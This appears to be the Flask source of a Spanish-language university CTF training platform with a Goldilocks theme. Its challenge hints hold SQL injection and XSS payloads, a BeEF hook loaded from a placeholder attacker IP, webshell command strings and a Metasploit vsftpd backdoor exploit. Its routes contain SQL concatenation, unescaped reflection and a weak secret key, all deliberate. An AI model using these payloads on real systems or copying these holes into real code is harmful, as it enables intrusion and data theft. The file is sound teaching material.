"""
RicitosFlow CTF — Aplicación principal
Flask + SQLite · Plataforma educativa CTF
Universidad de Cundinamarca
⚠ SOLO PARA USO EDUCATIVO EN ENTORNOS CONTROLADOS

Narrativa: "Ricitos de Oro y los Tres Osos"
12 banderas · 3 fases · 900 puntos · 120 minutos
"""

import os
import time
import base64
import sqlite3
import hashlib
import subprocess
import mimetypes
from functools import wraps
from flask import (
    Flask, render_template, request, redirect, url_for,
    session, flash, send_from_directory, send_file, g, jsonify, make_response
)
from werkzeug.utils import secure_filename

import participants_store      # cuentas de participantes (operaciones seguras)
import cernicalo_lab           # prólogo «El Guardián del Cernícalo» (SQLi controlada)

# Windows no siempre registra .webp: sin esto el logo se sirve como octet-stream
mimetypes.add_type('image/webp', '.webp')

# ──────────────────────────────────────────────────────
# Configuración
# ──────────────────────────────────────────────────────
app = Flask(__name__)

# ⚠ Clave débil intencional (desafío Medium en PrivEsc / cookies)
app.secret_key = 'osito123'

BASE_DIR   = os.path.dirname(os.path.abspath(__file__))
DB_PATH    = os.environ.get('GOLDILOCKS_DB_PATH', os.path.join(BASE_DIR, 'goldilocks.db'))
UPLOAD_DIR = os.path.join(BASE_DIR, 'uploads')
FLAGS_DIR  = os.path.join(BASE_DIR, 'flags')
DOCS_DIR   = os.path.join(BASE_DIR, 'static', 'docs')

os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(FLAGS_DIR,  exist_ok=True)
os.makedirs(DOCS_DIR,   exist_ok=True)

# Acceso de participantes y prólogo del Guardián: bases propias, independientes
# de goldilocks.db (que sigue siendo la de los retos y las puntuaciones).
PARTICIPANTS_DB_PATH = os.environ.get('RICITOS_PARTICIPANTS_DB_PATH',
                                      os.path.join(BASE_DIR, 'participants.db'))
CERNICALO_DB_PATH    = os.environ.get('RICITOS_CERNICALO_DB_PATH',
                                      os.path.join(BASE_DIR, 'cernicalo.db'))
AUTH_COOKIE          = 'rf_auth'

participants_store.init_db(PARTICIPANTS_DB_PATH)
cernicalo_lab.init_db(CERNICALO_DB_PATH)

# ──────────────────────────────────────────────────────
# Parámetros del juego
# ──────────────────────────────────────────────────────
GAME_SECONDS   = 120 * 60      # 120:00
HINT_PENALTY_S = 5 * 60        # -5 MIN por pista
HINT_PENALTY_P = 25           # -25 PTS por pista
WRONG_DETECT   = 8            # +8% detección por flag incorrecta
TOTAL_POINTS   = 900

# IP real de Metasploitable2 en el laboratorio host-only (retos 1, 4 y 10).
# Ajusta este valor si la VM toma otra IP por DHCP al recrearla.
LAB_TARGET_IP = os.environ.get('GOLDILOCKS_LAB_IP', '192.168.56.115')

# ──────────────────────────────────────────────────────
# Flags del CTF — 12 banderas, 3 fases
# ──────────────────────────────────────────────────────
FLAGS = {
    # Fase 1 · El Bosque · Reconocimiento
    'nmap':          'CTF{osito_bosque_nmap_hosts_activos}',
    'dork':          'CTF{mama_bosque_dork_archivo_expuesto}',
    'dirb':          'CTF{papa_bosque_dirb_ruta_oculta}',
    'wireshark':     'CTF{ricitos_bosque_wireshark_credenciales}',
    # Fase 2 · La Casa · Explotación Web
    'sqli_login':    'CTF{osito_casa_sqli_bypass_login}',
    'sqli_medium':   'CTF{mama_casa_sqli_burp_medium}',
    'xss_reflected': 'CTF{papa_casa_xss_reflected_cookie}',
    'xss_stored':    'CTF{ricitos_casa_xss_stored_beef_hook}',
    # Fase 3 · Las Habitaciones · Escalada
    'webshell':      'CTF{papa_habitacion_webshell_rce}',
    'metasploit':    'CTF{mama_habitacion_metasploit_exploit}',
    'privesc':       'CTF{osito_habitacion_privesc_root}',
    'stego':         'CTF{ricitos_habitacion_steghide_final}',
}

# 75 pts × 12 = 900
CHALLENGE_PTS = {k: 75 for k in FLAGS}

PHASES = [
    {'id': 1, 'name': 'La Cocina',        'tag': 'Reconocimiento',   'color': 'green'},
    {'id': 2, 'name': 'La Sala de Estar', 'tag': 'Explotación Web',   'color': 'gold'},
    {'id': 3, 'name': 'Las Habitaciones', 'tag': 'Escalada',          'color': 'red'},
]

# Metadatos de cada desafío (orden = orden de juego)
CHALLENGES_META = [
    # ── Fase 1 ──────────────────────────────────────────
    {'id': 'nmap', 'phase': 1, 'name': 'El Fondo de la Olla', 'icon': '🍜',
     'category': 'Nmap · Hosts activos', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_nmap',
     'brief': 'Escanea la red 192.168.56.0/24 e identifica los hosts activos y '
              'sus servicios. La huella está en el banner de un puerto no estándar '
              'del host correcto.',
     'hints': [
         'Empieza con un barrido de host: <code>nmap -sn 192.168.56.0/24</code>. '
         'Anota qué IPs responden.',
         'Sobre el host vivo lanza <code>nmap -sS -sV -p- 192.168.56.12</code>. '
         'Fíjate en el puerto <code>1337</code> y lee su banner.',
     ]},
    {'id': 'dork', 'phase': 1, 'name': 'Las Huellas en la Entrada', 'icon': '🔎',
     'category': 'Google Dorks · Archivo expuesto', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_dork',
     'brief': 'Un archivo interno quedó publicado sin querer. Usa operadores de '
              'búsqueda (<code>site:</code>, <code>filetype:</code>) para dar con él. '
              'La huella está en su contenido.',
     'hints': [
         'Prueba <code>site:goldilocks.ctf filetype:txt</code> o revisa '
         '<code>/robots.txt</code> para ver qué carpetas hay.',
         'El archivo se llama <code>informe_seguridad_osos.txt</code> y vive bajo '
         '<code>/static/docs/</code>.',
     ]},
    {'id': 'dirb', 'phase': 1, 'name': 'La Puerta Entornada', 'icon': '🚪',
     'category': 'Dirb · Ruta oculta', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_dirb',
     'brief': 'Hay una ruta del servidor que no está enlazada en ninguna página. '
              'Enumérala por fuerza bruta de directorios.',
     'hints': [
         '<code>dirb http://goldilocks.ctf/ /usr/share/wordlists/dirb/common.txt</code>. '
         'Busca códigos 200/301 fuera de lo común.',
         'La despensa de los osos está en <code>/despensa_secreta</code>.',
     ]},
    {'id': 'wireshark', 'phase': 1, 'name': 'Los Ojos que Vigilan', 'icon': '🛰️',
     'category': 'Wireshark · Credenciales', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_wireshark',
     'brief': 'Se capturó tráfico de la red de los osos. Alguien envió credenciales '
              'en texto claro. Descarga la captura y extrae la huella.',
     'hints': [
         'Abre la captura y filtra por <code>http.request.method == "POST"</code> '
         'o busca la cabecera <code>Authorization: Basic</code>.',
         'La cabecera <code>Authorization: Basic</code> lleva un valor Base64. '
         'Decodifícalo: <code>echo &lt;valor&gt; | base64 -d</code>.',
     ]},
    # ── Fase 2 ──────────────────────────────────────────
    {'id': 'sqli_login', 'phase': 2, 'name': 'El Tazón Demasiado Caliente', 'icon': '🥣',
     'category': 'SQLi · Bypass de login', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_sqli_login',
     'brief': 'El formulario de acceso concatena tu entrada directamente en la '
              'consulta SQL. Salta la autenticación sin conocer la contraseña.',
     'hints': [
         "Payload clásico en el usuario: <code>' OR '1'='1'#</code> "
         "(o <code>admin'--</code>).",
         'Al entrar como <code>admin</code> sin contraseña válida, el panel te '
         'muestra la huella.',
     ]},
    {'id': 'sqli_medium', 'phase': 2, 'name': 'La Cuchara de la Coincidencia', 'icon': '🥄',
     'category': 'SQLi Medium · Burp Suite', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_sqli_medium',
     'brief': 'El buscador de recetas filtra la comilla simple. Evádelo (comillas '
              'dobles, codificación) — interceptando la petición con Burp si hace falta '
              '— y saca la huella de la base de datos.',
     'hints': [
         'La comilla simple <code>\'</code> se elimina, pero la comilla doble '
         '<code>"</code> no. Prueba <code>" OR 1=1--</code>.',
         'La huella está en la columna <code>secret</code> de la tabla '
         '<code>recipes</code>: <code>" UNION SELECT name, secret FROM recipes--</code>.',
     ]},
    {'id': 'xss_reflected', 'phase': 2, 'name': 'La Cama de los Recuerdos', 'icon': '🪞',
     'category': 'XSS Reflejado · Cookie', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_xss_reflected',
     'brief': 'El saludo de la página refleja un parámetro sin sanear. Inyecta '
              '<code>&lt;script&gt;</code> y roba la cookie de sesión — está '
              'codificada en Base64.',
     'hints': [
         'Prueba <code>?nombre=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>.',
         'La cookie <code>bear_session</code> es Base64. Decodifícala para leer la '
         'huella.',
     ]},
    {'id': 'xss_stored', 'phase': 2, 'name': 'El Cojín Equivocado', 'icon': '🪑',
     'category': 'XSS Almacenado · BeEF', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_xss_stored',
     'brief': 'El muro de recados guarda los comentarios tal cual. Deja un payload '
              'persistente que cargue el hook de BeEF. Cuando el oso administrador '
              'revise el muro, quedará enganchado.',
     'hints': [
         'Publica un comentario con <code>&lt;script src="http://TU_IP:3000/hook.js"&gt;'
         '&lt;/script&gt;</code>.',
         'El bot administrador revisa el muro cada minuto. Pulsa "Simular visita del '
         'oso admin": si hay un <code>&lt;script&gt;</code> guardado, BeEF engancha y '
         'aparece la huella.',
     ]},
    # ── Fase 3 ──────────────────────────────────────────
    {'id': 'webshell', 'phase': 3, 'name': 'Papá Oso Despierta', 'icon': '🐚',
     'category': 'Webshell · RCE', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_webshell',
     'brief': 'La galería de fotos del bosque no valida bien lo que subes. Sube una '
              'webshell, consigue ejecución de comandos y lee la huella del sistema.',
     'hints': [
         'Sube <code>shell.py</code> y ábrelo con <code>/uploads/shell.py?cmd=id</code>.',
         'La huella está en <code>/flags/papa_oso.txt</code>: '
         '<code>?cmd=cat /flags/papa_oso.txt</code>.',
     ]},
    {'id': 'metasploit', 'phase': 3, 'name': 'Mamá Osa Despierta', 'icon': '🎯',
     'category': 'Metasploit · Exploit', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_metasploit',
     'brief': 'El host Metasploitable 2 corre un servicio vulnerable conocido. Con '
              '<code>msfconsole</code> consigue una sesión y busca la huella en el '
              'sistema comprometido.',
     'hints': [
         'El puerto <code>6200</code> (vsftpd 2.3.4) tiene una backdoor. '
         '<code>use exploit/unix/ftp/vsftpd_234_backdoor</code>.',
         'Con la shell: <code>cat /home/msfadmin/mama_osa.flag</code>.',
     ]},
    {'id': 'privesc', 'phase': 3, 'name': 'La Firma del Osito', 'icon': '🔑',
     'category': 'PrivEsc · Root', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_privesc',
     'brief': 'Ya tienes una shell de usuario limitado. Escala a root revisando '
              'permisos <code>sudo</code> y binarios SUID mal configurados. La huella '
              'está en <code>/root/flag.txt</code>. (En esta plataforma: escala tu rol '
              'de sesión a <code>admin</code>.)',
     'hints': [
         'Enumera: <code>sudo -l</code> y <code>find / -perm -4000 -type f 2>/dev/null</code>. '
         'Aquí: la cookie de sesión guarda <code>role</code> sin cifrar.',
         'Cambia la cookie <code>role</code> a <code>admin</code> (F12 → Application → '
         'Cookies) o revisa <code>/admin/config</code> para firmar la sesión con '
         '<code>flask-unsign</code>.',
     ]},
    {'id': 'stego', 'phase': 3, 'name': 'El Secreto del Lienzo', 'icon': '🖼️',
     'category': 'Esteganografía · steghide', 'pts': 75, 'interactive': True,
     'endpoint': 'challenge_stego',
     'brief': 'La prueba final: una imagen del cuadro del pasillo esconde datos con '
              'esteganografía. Extráelos con <code>steghide</code> y cierra la '
              'historia.',
     'hints': [
         '<code>steghide extract -sf cuadro_del_pasillo.jpg</code>. Te pedirá una '
         'contraseña.',
         'La contraseña es el nombre de la protagonista en minúsculas y sin tildes: '
         '<code>ricitos</code>. Si no tienes steghide: '
         '<code>strings cuadro_del_pasillo.png | grep CTF</code>.',
     ]},
]

CH_BY_ID = {c['id']: c for c in CHALLENGES_META}

# ──────────────────────────────────────────────────────
# Base de datos
# ──────────────────────────────────────────────────────
def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(e=None):
    db = g.pop('db', None)
    if db:
        db.close()

def query_db(sql, args=(), one=False):
    cur = get_db().execute(sql, args)
    rv = cur.fetchall()
    return (rv[0] if rv else None) if one else rv

# ──────────────────────────────────────────────────────
# Progreso persistente (goldilocks.db)
# La base es la fuente de verdad: `scores` guarda las huellas registradas y
# `hint_unlocks` las pistas abiertas. La sesión de Flask solo es una copia que
# se rehidrata al entrar, así el dashboard y el marcador cuentan lo mismo.
# ──────────────────────────────────────────────────────
def init_progress_db():
    """Crea la tabla de pistas si falta. Idempotente; no borra datos."""
    db = sqlite3.connect(DB_PATH)
    try:
        db.execute("""
            CREATE TABLE IF NOT EXISTS hint_unlocks (
                id        INTEGER PRIMARY KEY AUTOINCREMENT,
                username  TEXT    NOT NULL,
                hint_key  TEXT    NOT NULL,
                pts       INTEGER NOT NULL,
                UNIQUE(username, hint_key)
            )""")
        db.commit()
    finally:
        db.close()

init_progress_db()

def load_progress(username):
    """Huellas registradas y pistas abiertas de un participante, desde la base."""
    db = sqlite3.connect(DB_PATH)
    try:
        solved = [r[0] for r in db.execute(
            'SELECT challenge FROM scores WHERE username = ? ORDER BY id', (username,))
            if r[0] in FLAGS]
        hints = [r[0] for r in db.execute(
            'SELECT hint_key FROM hint_unlocks WHERE username = ? ORDER BY id', (username,))]
    finally:
        db.close()
    return solved, hints

def restore_progress(username):
    """Copia a la sesión el progreso guardado (huellas, pistas y su descuento)."""
    solved, hints = load_progress(username)
    session['solved'] = solved
    session['hints'] = hints
    session['penalty_points'] = len(hints) * HINT_PENALTY_P

def score_owner():
    """Nombre bajo el que se guardan los puntos: el de la cuenta autenticada
    (cookie rf_auth validada contra participants.db), no el de la cookie de
    sesión, que el reto privesc permite falsificar."""
    participant = current_participant()
    if participant:
        return participant['username']
    return session.get('username', 'ricitos')

# ──────────────────────────────────────────────────────
# Estado del juego (temporizador · detección · puntaje)
# ──────────────────────────────────────────────────────
def game_started():
    return 'game_start' in session

def start_game(username='ricitos', role='guest', guest=True):
    session['username']         = username
    session['role']             = role
    session['guest']            = guest
    session['game_start']       = time.time()
    session['penalty_seconds']  = 0
    session['penalty_points']   = 0
    session['detection_hits']   = 0
    session['solved']           = []
    session['hints']            = []          # ["nmap:0", "nmap:1", ...]
    session.setdefault('level', 'low')

def reset_game():
    keep_level = session.get('level', 'low')
    keep_user  = session.get('username', 'ricitos')
    keep_role  = session.get('role', 'guest')
    keep_guest = session.get('guest', True)
    session.clear()
    session['level'] = keep_level
    start_game(keep_user, keep_role, keep_guest)
    restore_progress(score_owner())      # el cronómetro se reinicia; las huellas guardadas no

def get_solved():
    return session.get('solved', [])

def get_score():
    raw = sum(CHALLENGE_PTS[k] for k in get_solved())
    return max(0, raw - session.get('penalty_points', 0))

def time_remaining():
    if not game_started():
        return GAME_SECONDS
    elapsed = time.time() - session['game_start']
    rem = GAME_SECONDS - elapsed - session.get('penalty_seconds', 0)
    return max(0, int(rem))

def detection_level():
    """0-100. Sube con el tiempo transcurrido y con cada flag incorrecta."""
    if not game_started():
        return 0
    elapsed = time.time() - session['game_start']
    by_time = (elapsed + session.get('penalty_seconds', 0)) / GAME_SECONDS * 100
    by_hits = session.get('detection_hits', 0) * WRONG_DETECT
    return max(0, min(100, int(by_time + by_hits)))

def game_over():
    return game_started() and (time_remaining() <= 0 or detection_level() >= 100)

@app.context_processor
def inject_game_state():
    solved = get_solved()
    return dict(
        g_started   = game_started(),
        g_guest     = session.get('guest', True),
        g_username  = session.get('username'),
        g_role      = session.get('role', 'guest'),
        g_level     = session.get('level', 'low'),
        g_remaining = time_remaining(),
        g_detection = detection_level(),
        g_score     = get_score(),
        g_total_pts = TOTAL_POINTS,
        g_solved    = solved,
        g_solved_n  = len(solved),
        g_total_ch  = len(FLAGS),
        g_over      = game_over(),
        PHASES      = PHASES,
        CHALLENGES  = CHALLENGES_META,
        hint_cost_min = HINT_PENALTY_S // 60,
        hint_cost_pts = HINT_PENALTY_P,
        lab_ip        = LAB_TARGET_IP,
    )

# ──────────────────────────────────────────────────────
# Guardas
# ──────────────────────────────────────────────────────
def play_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not game_started():
            return redirect(url_for('index'))
        if game_over():
            return redirect(url_for('lose'))
        return f(*args, **kwargs)
    return decorated

def hint_key(cid, n):
    return f'{cid}:{n}'

def unlocked_hints(cid):
    return [int(h.split(':')[1]) for h in session.get('hints', []) if h.startswith(cid + ':')]

app.jinja_env.globals['unlocked_hints'] = unlocked_hints


def challenge_nav(cid):
    """Devuelve (anterior, siguiente) según el orden de CHALLENGES_META."""
    ids = [c['id'] for c in CHALLENGES_META]
    if cid not in ids:
        return None, None
    i = ids.index(cid)
    prev_ch = CHALLENGES_META[i - 1] if i > 0 else None
    next_ch = CHALLENGES_META[i + 1] if i < len(CHALLENGES_META) - 1 else None
    return prev_ch, next_ch

app.jinja_env.globals['challenge_nav'] = challenge_nav

# ──────────────────────────────────────────────────────
# Acceso de participantes (participants.db)
# La identidad viaja en una cookie propia (HttpOnly) validada contra la base,
# no en la cookie de sesión de Flask, que el reto privesc permite falsificar.
# ──────────────────────────────────────────────────────
def current_participant():
    if 'participant' not in g:
        g.participant = participants_store.get_session_participant(
            PARTICIPANTS_DB_PATH, request.cookies.get(AUTH_COOKIE))
    return g.participant

def _login_response(participant_id, target):
    """Abre una sesión nueva para el participante y redirige."""
    participants_store.revoke_session(PARTICIPANTS_DB_PATH, request.cookies.get(AUTH_COOKIE))
    token = participants_store.create_session(PARTICIPANTS_DB_PATH, participant_id)
    resp = redirect(target)
    resp.set_cookie(AUTH_COOKIE, token, max_age=participants_store.SESSION_TTL,
                    httponly=True, samesite='Lax', secure=request.is_secure)
    return resp

def _begin_game(participant):
    """Arranca la partida con el sistema de progreso existente (sin cambios)."""
    start_game(username=participant['username'], role='guest', guest=True)
    restore_progress(participant['username'])
    flash('La partida ha comenzado. Los osos volverán en 120 minutos.', 'info')

# ──────────────────────────────────────────────────────
# Portada / arranque de partida
# ──────────────────────────────────────────────────────
@app.route('/')
def index():
    if game_started() and not game_over():
        return redirect(url_for('dashboard'))
    if current_participant():
        return redirect(url_for('guardian'))
    tab = request.args.get('tab')
    return render_template('index.html', tab=tab if tab in ('login', 'registro') else 'login')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    participant = participants_store.authenticate(PARTICIPANTS_DB_PATH, username, password)
    if not participant:
        flash('Usuario o contraseña incorrectos.', 'danger')
        return render_template('index.html', tab='login', form_user=username)
    session.clear()                       # sin restos de una partida anterior en este navegador
    if participants_store.prologue_cleared(PARTICIPANTS_DB_PATH, participant['id']):
        # El Guardián ya lo dejó pasar antes: directo al mapa, sin repetir el prólogo
        _begin_game(participant)
        return _login_response(participant['id'], url_for('dashboard'))
    return _login_response(participant['id'], url_for('guardian'))

@app.route('/registro', methods=['POST'])
def register():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '')
    confirm  = request.form.get('confirm', '')
    error = participants_store.validate_registration(username, password, confirm)
    if not error:
        # Nombres con puntuaciones históricas (invitados anteriores) quedan reservados
        # para que nadie herede puntos ajenos. Solo lectura sobre goldilocks.db.
        legacy = query_db('SELECT 1 FROM scores WHERE lower(username) = lower(?) LIMIT 1',
                          (username,), one=True)
        if legacy and not participants_store.username_exists(PARTICIPANTS_DB_PATH, username):
            error = 'Ese nombre ya aparece en el marcador. Elige otro.'
    if not error:
        pid, error = participants_store.create_participant(PARTICIPANTS_DB_PATH, username, password)
    if error:
        flash(error, 'danger')
        return render_template('index.html', tab='registro', form_user=username)
    session.clear()
    flash('Cuenta creada. El Guardián del Cernícalo te espera en la puerta del bosque.', 'success')
    return _login_response(pid, url_for('guardian'))

# ──────────────────────────────────────────────────────
# Prólogo · El Guardián del Cernícalo (cernicalo.db)
# Obligatorio antes del mapa. No da puntos ni toca scores.
# ──────────────────────────────────────────────────────
@app.route('/puerta-del-cernicalo', methods=['GET', 'POST'])
def guardian():
    participant = current_participant()
    if not participant:
        flash('Inicia sesión para llegar a la puerta del bosque.', 'warning')
        return redirect(url_for('index'))
    if game_started() and not game_over():
        return redirect(url_for('dashboard'))

    attempt = None
    if request.method == 'POST' and not participant['prologue_cleared']:
        attempt = cernicalo_lab.run_guardian_query(
            CERNICALO_DB_PATH, request.form.get('vigia', ''), request.form.get('santo', ''))
        participants_store.record_prologue_attempt(PARTICIPANTS_DB_PATH, participant['id'])
        if attempt['passed']:
            participants_store.mark_prologue_cleared(PARTICIPANTS_DB_PATH, participant['id'])
            participant['prologue_cleared'] = True

    return render_template('guardian.html', participant=participant, attempt=attempt,
                           cleared=participant['prologue_cleared'],
                           query_template=cernicalo_lab.QUERY_TEMPLATE.format(
                               vigia='<vigía>', santo='<santo y seña>'),
                           guardian_flag=cernicalo_lab.FLAG,
                           max_input=cernicalo_lab.MAX_INPUT)

@app.route('/start', methods=['POST'])
def start():
    # Ya no crea invitados: exige cuenta y el prólogo del Guardián superado.
    participant = current_participant()
    if not participant:
        flash('Inicia sesión o regístrate para entrar al bosque.', 'warning')
        return redirect(url_for('index'))
    if not participant['prologue_cleared']:
        return redirect(url_for('guardian'))
    if not (game_started() and not game_over()):
        _begin_game(participant)
    return redirect(url_for('dashboard'))

@app.route('/reset')
def reset():
    reset_game()
    flash('Escenario reiniciado. El cronómetro vuelve a 120:00.', 'info')
    return redirect(url_for('dashboard'))

@app.route('/logout')
def logout():
    session.clear()
    participants_store.revoke_session(PARTICIPANTS_DB_PATH, request.cookies.get(AUTH_COOKIE))
    resp = redirect(url_for('index'))
    resp.delete_cookie(AUTH_COOKIE)
    return resp

@app.route('/set_level/<level>')
def set_level(level):
    if level in ('low', 'medium', 'high'):
        session['level'] = level
    return redirect(request.referrer or url_for('dashboard'))

# ──────────────────────────────────────────────────────
# Estado JSON (para el cronómetro del cliente)
# ──────────────────────────────────────────────────────
@app.route('/state.json')
def state_json():
    return jsonify(
        remaining=time_remaining(),
        detection=detection_level(),
        score=get_score(),
        over=game_over(),
        solved=get_solved(),
    )

# ──────────────────────────────────────────────────────
# Pantalla de derrota
# ──────────────────────────────────────────────────────
@app.route('/lose')
def lose():
    if not game_started():
        return redirect(url_for('index'))
    return render_template('lose.html')

# ──────────────────────────────────────────────────────
# Dashboard
# ──────────────────────────────────────────────────────
@app.route('/dashboard')
@play_required
def dashboard():
    return render_template('dashboard.html')

# ──────────────────────────────────────────────────────
# Pistas ("Páginas del Cuento Perdido")
# ──────────────────────────────────────────────────────
@app.route('/hint/<cid>/<int:n>', methods=['POST'])
@play_required
def unlock_hint(cid, n):
    ch = CH_BY_ID.get(cid)
    if not ch or n >= len(ch['hints']):
        flash('Esa pista no existe.', 'danger')
        return redirect(request.referrer or url_for('dashboard'))
    key = hint_key(cid, n)
    hints = session.get('hints', [])
    if key not in hints:
        db = sqlite3.connect(DB_PATH)
        try:
            db.execute('INSERT OR IGNORE INTO hint_unlocks (username, hint_key, pts) VALUES (?,?,?)',
                       (score_owner(), key, HINT_PENALTY_P))
            db.commit()
        finally:
            db.close()
        hints.append(key)
        session['hints'] = hints
        session['penalty_seconds'] = session.get('penalty_seconds', 0) + HINT_PENALTY_S
        session['penalty_points']  = session.get('penalty_points', 0) + HINT_PENALTY_P
        flash(f'Pista desbloqueada: -{HINT_PENALTY_S // 60} MIN / -{HINT_PENALTY_P} PTS.', 'warning')
    return redirect(request.referrer or url_for('dashboard'))

# ──────────────────────────────────────────────────────
# Envío de flags
# ──────────────────────────────────────────────────────
@app.route('/submit_flag', methods=['POST'])
@play_required
def submit_flag():
    cid  = request.form.get('challenge', '')
    flag = request.form.get('flag', '').strip()
    ch   = CH_BY_ID.get(cid)

    if not ch:
        flash('Desafío desconocido.', 'danger')
        return redirect(url_for('dashboard'))

    solved = session.get('solved', [])
    if cid in solved:
        flash('Ya registraste esta huella.', 'info')
    elif flag == FLAGS[cid]:
        pts = CHALLENGE_PTS[cid]
        try:
            db = sqlite3.connect(DB_PATH)
            try:
                cur = db.execute(
                    'INSERT OR IGNORE INTO scores (username, challenge, pts) VALUES (?,?,?)',
                    (score_owner(), cid, pts))
                db.commit()
                is_new = cur.rowcount == 1
            finally:
                db.close()
        except sqlite3.Error:
            app.logger.exception('No se pudo guardar la huella %s', cid)
            flash('No se pudo guardar la huella. Inténtalo de nuevo en un momento.', 'danger')
            return redirect(url_for(ch['endpoint']))
        solved.append(cid)
        session['solved'] = solved
        if is_new:
            flash(f'🐾 ¡Huella correcta! +{pts} PTS.', 'success')
        else:
            flash('Esta huella ya estaba en tu álbum: no suma de nuevo.', 'info')
    else:
        session['detection_hits'] = session.get('detection_hits', 0) + 1
        flash('Huella incorrecta. Los osos husmean más cerca…', 'danger')

    if game_over():
        return redirect(url_for('lose'))
    return redirect(url_for(ch['endpoint']))

# ══════════════════════════════════════════════════════
# FASE 1 · EL BOSQUE
# ══════════════════════════════════════════════════════

@app.route('/robots.txt')
def robots():
    return app.response_class(
        "User-agent: *\n"
        "Disallow: /admin\n"
        "Disallow: /flags\n"
        "Disallow: /uploads\n"
        "Disallow: /static/docs/\n"
        "Disallow: /despensa_secreta\n"
        "# Nota interna: /static/docs/informe_seguridad_osos.txt NO debe indexarse\n",
        mimetype='text/plain')

@app.route('/challenges/nmap')
@play_required
def challenge_nmap():
    # "banner" simulado del puerto 1337 del host correcto
    banner = (
        "Nmap scan report for 192.168.56.12\n"
        "Host is up (0.00042s latency).\n"
        "PORT     STATE SERVICE VERSION\n"
        "22/tcp   open  ssh     OpenSSH 8.2p1\n"
        "80/tcp   open  http    nginx 1.18.0\n"
        f"1337/tcp open  soup    Osito-Soup-Daemon 1.0 (banner: {FLAGS['nmap']})\n"
    )
    return render_template('challenges/nmap.html', ch=CH_BY_ID['nmap'], banner=banner)

@app.route('/challenges/dork')
@play_required
def challenge_dork():
    return render_template('challenges/dork.html', ch=CH_BY_ID['dork'])

@app.route('/challenges/dirb')
@play_required
def challenge_dirb():
    return render_template('challenges/dirb.html', ch=CH_BY_ID['dirb'])

# Ruta NO enlazada — descubrible con dirb
@app.route('/despensa_secreta')
@app.route('/despensa_secreta/')
def despensa_secreta():
    return app.response_class(
        "── DESPENSA SECRETA DE PAPÁ OSO ──\n\n"
        "Inventario: 3 tarros de miel, 1 saco de avena, frambuesas.\n"
        f"Post-it olvidado en el estante: {FLAGS['dirb']}\n",
        mimetype='text/plain')

@app.route('/challenges/wireshark')
@play_required
def challenge_wireshark():
    return render_template('challenges/wireshark.html', ch=CH_BY_ID['wireshark'])

@app.route('/challenges/wireshark/captura.pcap')
@play_required
def wireshark_capture():
    creds  = f"ricitos:{FLAGS['wireshark']}"
    b64    = base64.b64encode(creds.encode()).decode()
    # "captura" en texto: reproduce lo que vería el analista en el follow TCP stream
    body = (
        "# Goldilocks-CTF — captura de red (export como texto del stream TCP)\n"
        "# frame 42  192.168.56.20 -> 192.168.56.12  HTTP\n\n"
        "POST /login HTTP/1.1\r\n"
        "Host: goldilocks.ctf\r\n"
        f"Authorization: Basic {b64}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: close\r\n\r\n"
        "usuario=ricitos&recordar=1\r\n\n"
        "# --- sugerencia: decodifica el valor Base64 de la cabecera Authorization ---\n"
    )
    resp = make_response(body)
    resp.headers['Content-Type'] = 'application/octet-stream'
    resp.headers['Content-Disposition'] = 'attachment; filename=captura_bosque.pcap'
    return resp

# ══════════════════════════════════════════════════════
# FASE 2 · LA CASA
# ══════════════════════════════════════════════════════

@app.route('/challenges/sqli-login', methods=['GET', 'POST'])
@play_required
def challenge_sqli_login():
    outcome = None
    query   = None
    if request.method == 'POST':
        u = request.form.get('username', '')
        p = request.form.get('password', '')
        query = f"SELECT username, role FROM users WHERE username = '{u}' AND password = '{p}'"
        try:
            db  = sqlite3.connect(DB_PATH)
            row = db.execute(query).fetchone()
            db.close()
            if row:
                # ¿fue un bypass? -> la contraseña real no coincide con la enviada
                legit = query_db('SELECT password FROM users WHERE username = ?',
                                 (row[0],), one=True)
                is_bypass = not legit or legit[0] != hashlib.sha256(p.encode()).hexdigest()
                if is_bypass:
                    outcome = {'ok': True, 'user': row[0], 'role': row[1],
                               'flag': FLAGS['sqli_login']}
                else:
                    outcome = {'ok': False, 'msg': 'Login normal (sin inyección).'}
            else:
                outcome = {'ok': False, 'msg': 'Credenciales incorrectas.'}
        except Exception as e:
            outcome = {'ok': False, 'msg': f'Error SQL: {e}'}
    return render_template('challenges/sqli_login.html', ch=CH_BY_ID['sqli_login'],
                           outcome=outcome, query=query)

@app.route('/challenges/sqli-medium', methods=['GET', 'POST'])
@play_required
def challenge_sqli_medium():
    columns, results, query = [], None, None
    if request.method == 'POST':
        raw = request.form.get('ingredient', '')
        query = raw
        safe = raw.replace("'", "")          # ⚠ solo filtra comilla simple
        sql = f'SELECT name, description FROM recipes WHERE ingredient = "{safe}"'
        try:
            db  = sqlite3.connect(DB_PATH)
            cur = db.execute(sql)
            columns = [d[0] for d in cur.description]
            results = [list(r) for r in cur.fetchall()]
            db.close()
        except Exception as e:
            flash(f'Error SQL: {e}', 'danger')
            results = []
    return render_template('challenges/sqli_medium.html', ch=CH_BY_ID['sqli_medium'],
                           columns=columns, results=results, query=query, sql_hint=True)

@app.route('/challenges/xss-reflected')
@play_required
def challenge_xss_reflected():
    nombre = request.args.get('nombre', '')      # ⚠ reflejado sin escape
    resp = make_response(render_template('challenges/xss_reflected.html',
                                         ch=CH_BY_ID['xss_reflected'], nombre=nombre))
    # cookie "de sesión" con la bandera en Base64
    resp.set_cookie('bear_session',
                    base64.b64encode(FLAGS['xss_reflected'].encode()).decode())
    return resp

# Comentarios en memoria (se reinician al reiniciar el server)
STORED_COMMENTS = []

@app.route('/challenges/xss-stored', methods=['GET', 'POST'])
